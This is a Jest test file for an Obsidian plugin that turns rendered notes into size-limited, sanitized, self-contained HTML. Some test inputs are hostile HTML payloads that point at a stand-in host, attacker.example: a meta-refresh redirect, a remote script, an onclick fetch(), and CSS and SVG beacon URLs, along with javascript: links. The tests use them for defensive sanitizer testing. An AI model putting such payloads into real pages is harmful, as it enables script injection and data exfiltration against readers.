import {
  buildSymposiumDocument,
  createSymposiumDocument,
  createSymposiumReviewDocument,
  SYMPOSIUM_MAX_HTML_BYTES,
  SymposiumDocumentTooLargeError,
  SymposiumDocumentUnsafeError,
} from "@/symposium/symposiumDocument";
import { App, Component, MarkdownRenderer, TFile } from "obsidian";

jest.mock("obsidian", () => ({
  MarkdownRenderer: { render: jest.fn() },
}));

const renderMock = (MarkdownRenderer as unknown as { render: jest.Mock })
  .render as jest.MockedFunction<
  (
    app: App,
    markdown: string,
    el: HTMLElement,
    sourcePath: string,
    component: Component
  ) => Promise<void>
>;

interface TestFile extends TFile {
  resourceUrl?: string;
}

interface AppOptions {
  markdown?: string;
  files?: TestFile[];
  readBinary?: (file: TFile) => Promise<ArrayBuffer>;
  resolveLink?: (link: string, sourcePath: string) => TFile | null;
}

function createFile(path: string, resourceUrl?: string, size = 0): TestFile {
  const name = path.split("/").at(-1) ?? path;
  const extension = name.includes(".") ? (name.split(".").at(-1) ?? "") : "";
  return {
    path,
    name,
    basename: extension ? name.slice(0, -(extension.length + 1)) : name,
    extension,
    resourceUrl,
    stat: { ctime: 0, mtime: 0, size },
  } as TestFile;
}

function createApp(options: AppOptions = {}): App {
  const files = options.files ?? [];
  return {
    vault: {
      read: jest.fn().mockResolvedValue(options.markdown ?? "# Source Markdown"),
      getFiles: jest.fn(() => files),
      getResourcePath: jest.fn((file: TestFile) => file.resourceUrl ?? `app://vault/${file.path}`),
      readBinary: jest.fn(options.readBinary ?? (async () => new ArrayBuffer(0))),
      getAbstractFileByPath: jest.fn(
        (path: string) => files.find((file) => file.path === path) ?? null
      ),
    },
    metadataCache: {
      getFirstLinkpathDest: jest.fn(options.resolveLink ?? (() => null)),
    },
  } as unknown as App;
}

function createComponent(): Component {
  return { register: jest.fn() } as unknown as Component;
}

function appendHtml(element: HTMLElement, html: string): void {
  const parsed = new DOMParser().parseFromString(html, "text/html");
  element.append(...parsed.body.childNodes);
}

describe("symposiumDocument", () => {
  beforeEach(() => {
    renderMock.mockReset();
  });

  describe("SymposiumDocumentTooLargeError", () => {
    describe("constructor()", () => {
      it("retains the measured byte length", () => {
        const error = new SymposiumDocumentTooLargeError(SYMPOSIUM_MAX_HTML_BYTES + 1);

        expect(error).toBeInstanceOf(Error);
        expect(error.byteLength).toBe(SYMPOSIUM_MAX_HTML_BYTES + 1);
      });
    });
  });

  describe("SymposiumDocumentUnsafeError", () => {
    describe("constructor()", () => {
      it("describes active or remote content as invalid finished HTML", () => {
        const error = new SymposiumDocumentUnsafeError([
          "remove unsupported <script>",
          'embed or remove "src" on <img>',
        ]);

        expect(error).toBeInstanceOf(Error);
        expect(error.message).toBe(
          'Symposium HTML is not publishable: remove unsupported <script>; embed or remove "src" on <img>.'
        );
      });
    });
  });

  describe("createSymposiumDocument()", () => {
    it("freezes the exact HTML string and its UTF-8 byte length", () => {
      const html = "<!doctype html><html><body>Résumé</body></html>\n";

      const result = createSymposiumDocument("Review", html);

      expect(result).toEqual({
        title: "Review",
        html,
        byteLength: new TextEncoder().encode(html).byteLength,
      });
      expect(Object.isFrozen(result)).toBe(true);
    });

    it("rejects HTML whose UTF-8 encoding exceeds the existing byte limit", () => {
      const html = "é".repeat(Math.floor(SYMPOSIUM_MAX_HTML_BYTES / 2) + 1);

      expect(() => createSymposiumDocument("Too large", html)).toThrow(
        SymposiumDocumentTooLargeError
      );
    });
  });

  describe("createSymposiumReviewDocument()", () => {
    it("returns exact immutable passive HTML with embedded styling and assets", () => {
      const html =
        '<!doctype html><html><head><style>:root{--ink:#123}@media (prefers-color-scheme:dark){:root{--ink:#eee}}circle{fill:var(--ink);filter:url("#shadow")}</style></head><body><a href="https://example.com">Source</a><img src="data:image/png;base64,iVBORw0KGgo="><svg><defs><filter id="shadow"></filter><linearGradient id="paint"></linearGradient></defs><circle cx="1" cy="1" r="1" fill="url(#paint)"></circle></svg></body></html>';

      const result = createSymposiumReviewDocument("Review", html);

      expect(result.html).toBe(html);
      expect(Object.isFrozen(result)).toBe(true);
    });

    it.each([
      [
        "automatic redirects",
        '<meta content="0;url=https://attacker.example/leak" HTTP-EQUIV=" Refresh ">',
      ],
      ["active elements", '<script src="https://attacker.example/run.js"></script>'],
      ["event handlers", "<p onclick=\"fetch('https://attacker.example/')\">Review</p>"],
      ["remote assets", '<img src="https://attacker.example/note.png">'],
      ["executable links", '<a href="javascript:alert(1)">Review</a>'],
      ["CSS resource URLs", "<style>body{background:url(https://attacker.example/pixel)}</style>"],
      ["CSS imports", '<style>@import "//attacker.example/style.css";</style>'],
      [
        "SVG resource URLs",
        '<svg><use href="https://attacker.example/icons.svg#note"></use></svg>',
      ],
      ["nested HTML documents", '<iframe srcdoc="<p>Hidden</p>"></iframe>'],
    ])("rejects %s before review", (_case, body) => {
      const html = `<!doctype html><html><body>${body}</body></html>`;

      expect(() => createSymposiumReviewDocument("Unsafe", html)).toThrow(
        SymposiumDocumentUnsafeError
      );
    });

    it("reports every actionable violation in one failure", () => {
      const html =
        '<!doctype html><script></script><img src="https://attacker.example/pixel"><p onclick="alert(1)">Review</p>';

      expect(() => createSymposiumReviewDocument("Unsafe", html)).toThrow(
        'remove unsupported <script>; embed or remove "src" on <img>; remove "onclick" from <p>'
      );
    });
  });

  describe("buildSymposiumDocument()", () => {
    it("serializes the settled Obsidian reading-view output as a complete HTML document", async () => {
      const app = createApp({ markdown: "# Markdown that must not be reparsed" });
      const file = createFile("Notes/Rendered note.md");
      const component = createComponent();
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        await Promise.resolve();
        appendHtml(
          element,
          '<section class="callout" data-callout="info"><p>Postprocessed output</p></section>'
        );
      });

      const result = await buildSymposiumDocument(app, file, component, document);

      expect(renderMock).toHaveBeenCalledWith(
        app,
        "# Markdown that must not be reparsed",
        expect.any(HTMLElement),
        file.path,
        component
      );
      expect(app.vault.read).toHaveBeenCalledWith(file);
      expect(result.title).toBe("Rendered note");
      expect(result.html).toMatch(/^<!doctype html><html lang="en"><head>/);
      expect(result.html).toContain('<meta charset="utf-8">');
      expect(result.html).toContain("<title>Rendered note</title>");
      expect(result.html).toContain(
        '<article class="markdown-preview-view markdown-rendered symposium-document">'
      );
      expect(result.html).toContain(
        '<section class="callout" data-callout="info"><p>Postprocessed output</p></section>'
      );
      expect(result.html).not.toContain("# Markdown that must not be reparsed");
      expect(result.byteLength).toBe(new TextEncoder().encode(result.html).byteLength);
      expect(app.vault.getFiles).not.toHaveBeenCalled();
    });

    it("omits rendered frontmatter and properties from the public document", async () => {
      const app = createApp({
        markdown: "---\ntitle: Private metadata\ntags: [internal]\n---\n# Public body",
      });
      const file = createFile("Notes/Public body.md");
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(
          element,
          '<div class="metadata-container">Properties UI</div><pre class="frontmatter language-yaml"><code>title: Private metadata</code></pre><h1>Public body</h1>'
        );
      });

      const result = await buildSymposiumDocument(app, file, createComponent(), document);

      expect(result.html).not.toContain("metadata-container");
      expect(result.html).not.toContain("frontmatter");
      expect(result.html).not.toContain("Private metadata");
      expect(result.html).toContain("<h1>Public body</h1>");
    });

    it("removes active content and dangerous attributes while retaining safe external links", async () => {
      const app = createApp();
      const file = createFile("Unsafe.md");
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(
          element,
          `
          <script>alert("x")</script>
          <style>body { display: none }</style>
          <iframe src="https://tracker.example"></iframe>
          <form><input value="secret"></form>
          <p id="safe" style="background:url(javascript:alert(1))" onclick="alert(1)">Text</p>
          <a id="bad-link" href="javascript:alert(1)">Bad</a>
          <a id="safe-link" href="https://example.com" ping="https://tracker.example" referrerpolicy="unsafe-url" target="_blank">External</a>
          <a id="named-target-link" href="https://example.com/preview" target="preview" rel="opener">Preview</a>
          <a id="scheme-relative-link" href="//docs.example.com/guide">Docs</a>
          <a class="internal-link is-unresolved" data-href="Private note" href="Private note">Private</a>
          <img id="remote-image" src="https://tracker.example/pixel" referrerpolicy="unsafe-url">
          <img id="scheme-relative-image" src="//cdn.example.com/image.png">
          <svg><a id="bad-svg-link" href="data:text/html,bad"><text>SVG</text></a></svg>
        `
        );
      });

      const result = await buildSymposiumDocument(app, file, createComponent(), document);
      const parsed = new DOMParser().parseFromString(result.html, "text/html");

      expect(
        parsed.querySelector(
          "script, style:not(#symposium-obsidian-publish-baseline), iframe, form"
        )
      ).toBeNull();
      expect(parsed.querySelector("#safe")?.hasAttribute("style")).toBe(false);
      expect(parsed.querySelector("#safe")?.hasAttribute("onclick")).toBe(false);
      expect(parsed.querySelector("#bad-link")?.hasAttribute("href")).toBe(false);
      expect(parsed.querySelector("#bad-svg-link")?.hasAttribute("href")).toBe(false);
      expect(parsed.querySelector("#safe-link")?.getAttribute("href")).toBe("https://example.com");
      expect(parsed.querySelector("#safe-link")?.hasAttribute("ping")).toBe(false);
      expect(parsed.querySelector("#safe-link")?.getAttribute("rel")).toBe("noopener noreferrer");
      expect(parsed.querySelector("#safe-link")?.hasAttribute("referrerpolicy")).toBe(false);
      expect(parsed.querySelector("#named-target-link")?.getAttribute("target")).toBe("preview");
      expect(parsed.querySelector("#named-target-link")?.getAttribute("rel")).toBe(
        "noopener noreferrer"
      );
      expect(parsed.querySelector("#scheme-relative-link")?.getAttribute("href")).toBe(
        "//docs.example.com/guide"
      );
      expect(parsed.querySelector("#remote-image")?.getAttribute("referrerpolicy")).toBe(
        "no-referrer"
      );
      expect(parsed.querySelector("#scheme-relative-image")?.getAttribute("src")).toBe(
        "//cdn.example.com/image.png"
      );
      expect(parsed.querySelector("#scheme-relative-image")?.getAttribute("referrerpolicy")).toBe(
        "no-referrer"
      );
      expect(parsed.querySelector("a.internal-link")).toBeNull();
      expect(parsed.querySelector("span.internal-link")?.textContent).toBe("Private");
      expect(parsed.querySelector("span.internal-link")?.classList.contains("is-unresolved")).toBe(
        false
      );
      expect(app.vault.getFiles).not.toHaveBeenCalled();
    });

    it("keeps rendered math and task state without Obsidian runtime resources", async () => {
      const app = createApp();
      const file = createFile("Math and tasks.md");
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(
          element,
          `
          <mjx-container class="MathJax" jax="CHTML" display="true">
            <mjx-math><mjx-mi><mjx-c class="mjx-c1D465"></mjx-c></mjx-mi></mjx-math>
            <mjx-assistive-mml>
              <math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
                <mi>x</mi>
              </math>
            </mjx-assistive-mml>
          </mjx-container>
          <ul class="contains-task-list">
            <li class="task-list-item"><input class="task-list-item-checkbox" type="checkbox">Open</li>
            <li class="task-list-item"><input class="task-list-item-checkbox" type="checkbox" checked>Done</li>
          </ul>
        `
        );
      });

      const result = await buildSymposiumDocument(app, file, createComponent(), document);
      const parsed = new DOMParser().parseFromString(result.html, "text/html");

      expect(parsed.querySelector("mjx-container")).toBeNull();
      expect(parsed.querySelector("math")?.textContent?.trim()).toBe("x");
      expect(
        [...parsed.querySelectorAll(".symposium-task-marker")].map((marker) => marker.textContent)
      ).toEqual(["☐", "☑"]);
      expect(parsed.querySelector("input")).toBeNull();
    });

    it("embeds vault images with content-derived MIME types and leaves remote images remote", async () => {
      const png = createFile("Assets/chart.bin", "app://vault-resource/chart");
      const jpeg = createFile("Assets/photo.jpeg");
      const corrupt = createFile("Assets/corrupt.png");
      const app = createApp({
        files: [png, jpeg, corrupt],
        resolveLink: (link) => (link === "Assets/photo.jpeg" ? jpeg : null),
        readBinary: async (file) => {
          if (file.path === png.path) {
            return new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).buffer;
          }
          if (file.path === jpeg.path) {
            return new Uint8Array([0xff, 0xd8, 0xff, 0xdb]).buffer;
          }
          return new TextEncoder().encode("not an image").buffer as ArrayBuffer;
        },
      });
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(
          element,
          `
          <img id="resource" alt="Chart" src="app://vault-resource/chart">
          <img id="linked" alt="Photo" data-path="Assets/photo.jpeg" src="Assets/photo.jpeg">
          <img id="remote" alt="Remote" src="https://images.example/image.png">
          <img id="embedded" alt="Embedded" src="data:image/gif;base64,R0lGODlh">
          <img id="corrupt" alt="Corrupt image" data-path="Assets/corrupt.png" src="Assets/corrupt.png">
          <img id="missing" alt="Missing diagram" src="Assets/missing.png">
        `
        );
      });

      const result = await buildSymposiumDocument(
        app,
        createFile("Notes/Images.md"),
        createComponent(),
        document
      );
      const parsed = new DOMParser().parseFromString(result.html, "text/html");

      expect(parsed.querySelector<HTMLImageElement>("#resource")?.src).toBe(
        "data:image/png;base64,iVBORw0KGgo="
      );
      expect(parsed.querySelector<HTMLImageElement>("#linked")?.src).toBe(
        "data:image/jpeg;base64,/9j/2w=="
      );
      expect(parsed.querySelector("#linked")?.hasAttribute("data-path")).toBe(false);
      expect(parsed.querySelector<HTMLImageElement>("#remote")?.getAttribute("src")).toBe(
        "https://images.example/image.png"
      );
      expect(parsed.querySelector<HTMLImageElement>("#embedded")?.getAttribute("src")).toBe(
        "data:image/gif;base64,R0lGODlh"
      );
      expect(parsed.querySelector("#corrupt")).toBeNull();
      expect(parsed.querySelector(".symposium-missing-asset")?.textContent).toBe(
        "[Missing image: Corrupt image]"
      );
      expect(parsed.querySelector("#missing")).toBeNull();
      expect(parsed.querySelectorAll(".symposium-missing-asset")[1]?.textContent).toBe(
        "[Missing image: Missing diagram]"
      );
      expect(app.vault.readBinary).toHaveBeenCalledTimes(3);
    });

    it("rejects an oversized local image before loading its binary", async () => {
      const oversized = createFile(
        "Assets/oversized.png",
        undefined,
        Math.floor((SYMPOSIUM_MAX_HTML_BYTES * 3) / 4) + 1
      );
      const app = createApp({ files: [oversized] });
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(element, '<img alt="Oversized" src="Assets/oversized.png">');
      });

      await expect(
        buildSymposiumDocument(app, createFile("Images.md"), createComponent(), document)
      ).rejects.toBeInstanceOf(SymposiumDocumentTooLargeError);
      expect(app.vault.readBinary).not.toHaveBeenCalled();
    });

    it("rejects cumulative local image data before loading the image that exceeds the budget", async () => {
      const imageSize = Math.floor((SYMPOSIUM_MAX_HTML_BYTES * 3) / 8);
      const first = createFile("Assets/first.png", undefined, imageSize);
      const second = createFile("Assets/second.png", undefined, imageSize);
      const bytes = new Uint8Array(imageSize);
      bytes.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const app = createApp({
        files: [first, second],
        readBinary: async () => bytes.buffer,
      });
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(
          element,
          '<img alt="First" src="Assets/first.png"><img alt="Second" src="Assets/second.png">'
        );
      });

      await expect(
        buildSymposiumDocument(app, createFile("Images.md"), createComponent(), document)
      ).rejects.toBeInstanceOf(SymposiumDocumentTooLargeError);
      expect(app.vault.readBinary).toHaveBeenCalledTimes(1);
    });

    it("reserves rendered HTML before loading an image that would exceed the combined budget", async () => {
      const image = createFile(
        "Assets/large.png",
        undefined,
        Math.floor((SYMPOSIUM_MAX_HTML_BYTES * 3) / 8)
      );
      const app = createApp({ files: [image] });
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        element.append("x".repeat(Math.floor(SYMPOSIUM_MAX_HTML_BYTES / 2)));
        appendHtml(element, '<img alt="Large" src="Assets/large.png">');
      });

      await expect(
        buildSymposiumDocument(app, createFile("Images.md"), createComponent(), document)
      ).rejects.toBeInstanceOf(SymposiumDocumentTooLargeError);
      expect(app.vault.readBinary).not.toHaveBeenCalled();
    });

    it("budgets the embedded image replacement delta instead of removed source markup", async () => {
      const longPath = `Assets/${"a".repeat(16_000)}.png`;
      const dataUrlBudget = SYMPOSIUM_MAX_HTML_BYTES - 10_000;
      const imageSize = Math.floor(((dataUrlBudget - "data:image/png;base64,".length) * 3) / 4);
      const image = createFile(longPath, undefined, imageSize);
      const bytes = new Uint8Array(imageSize);
      bytes.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const app = createApp({
        files: [image],
        resolveLink: (link) => (link === longPath ? image : null),
        readBinary: async () => bytes.buffer,
      });
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        appendHtml(element, `<img alt="Near limit" data-path="${longPath}" src="local.png">`);
      });

      const result = await buildSymposiumDocument(
        app,
        createFile("Images.md"),
        createComponent(),
        document
      );

      expect(result.byteLength).toBeLessThanOrEqual(SYMPOSIUM_MAX_HTML_BYTES);
      expect(result.html).not.toContain(longPath);
      expect(app.vault.readBinary).toHaveBeenCalledTimes(1);
    });

    it("reports the UTF-8 byte length for non-ASCII titles and rendered content", async () => {
      const app = createApp();
      const file = createFile("Notes/Résumé 🚀.md");
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        element.textContent = "你好 🌍";
      });

      const result = await buildSymposiumDocument(app, file, createComponent(), document);

      expect(result.title).toBe("Résumé 🚀");
      expect(result.byteLength).toBe(new TextEncoder().encode(result.html).byteLength);
      expect(result.byteLength).toBeGreaterThan(result.html.length);
    });

    it("accepts exactly 10 MiB of final HTML and rejects one additional byte", async () => {
      const app = createApp();
      const file = createFile("Boundary.md");
      let renderedText = "";
      renderMock.mockImplementation(async (_app, _markdown, element) => {
        element.textContent = renderedText;
      });

      const empty = await buildSymposiumDocument(app, file, createComponent(), document);
      renderedText = "x".repeat(SYMPOSIUM_MAX_HTML_BYTES - empty.byteLength);
      const exact = await buildSymposiumDocument(app, file, createComponent(), document);

      expect(exact.byteLength).toBe(SYMPOSIUM_MAX_HTML_BYTES);

      renderedText += "x";
      await expect(buildSymposiumDocument(app, file, createComponent(), document)).rejects.toThrow(
        `Symposium HTML is ${SYMPOSIUM_MAX_HTML_BYTES + 1} bytes; the limit is ${SYMPOSIUM_MAX_HTML_BYTES} bytes.`
      );
    });
  });
});
